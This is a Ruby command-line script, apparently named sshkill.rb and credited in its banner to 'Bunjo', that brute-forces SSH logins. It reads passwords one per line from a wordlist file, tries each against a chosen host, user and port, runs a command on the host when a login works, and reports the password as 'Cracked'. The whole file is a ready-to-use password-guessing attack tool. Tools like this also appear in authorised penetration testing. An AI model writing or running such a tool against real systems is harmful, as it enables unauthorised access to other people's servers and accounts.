require 'net/ssh'
require 'colorize'
require 'optparse'

def banner
  banner_text = <<-'BANNER'
 __   __                        
/__` /__` |__| |__/ | |    |    Author: Bunjo
.__/ .__/ |  | |  \ | |___ |___ Github: https://github.com/thebunjo           
  BANNER
  puts banner_text.yellow
end

options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ruby sshkill.rb [options]"

  opts.on("-h", "--host HOST", "Hostname") do |host|
    options[:host] = host
  end

  opts.on("-u", "--user USER", "Username") do |user|
    options[:user] = user
  end

  opts.on("-p", "--port PORT", "SSH Port (default is 22)") do |port|
    options[:port] = port
  end

  opts.on("-t", "--timeout TIMEOUT", "Timeout (default is 1)") do |timeout|
    options[:timeout] = timeout
  end

  opts.on("-f", "--file FILE", "Password file") do |file|
    options[:file] = file
  end
end.parse!

def check_host(hostname, username, pass, port, timeout)
  begin
    Net::SSH.start(hostname, username, password: pass, port: port.to_i, timeout: timeout.to_i) do |ssh|
      ssh.exec!("hostname")
    end
    true
  rescue => e
    false
  end
end

def run(options)
  host = options[:host]
  username = options[:user]
  passlist = options[:file]
  port = options[:port] || 22
  timeout = options[:timeout] || 1

  raise "Please set arguments. #{print_usage}" if username.nil? || host.nil? || passlist.nil?

  file = File.open(passlist)
  file.each do |pword|
    password = pword.strip
    puts "Try: #{host.blue}@#{username.red}:#{password}"
    if check_host(host, username, password, port, timeout)
      puts " --> Cracked".green
      exit(0)
    else
      puts " --> False".red
    end
  end
rescue RuntimeError => b
  puts b.message
end

def print_usage
  puts "ruby sshkill.rb -h HOST -u USER -f FILE [-p PORT] [-t TIMEOUT]"
end

banner
run(options)
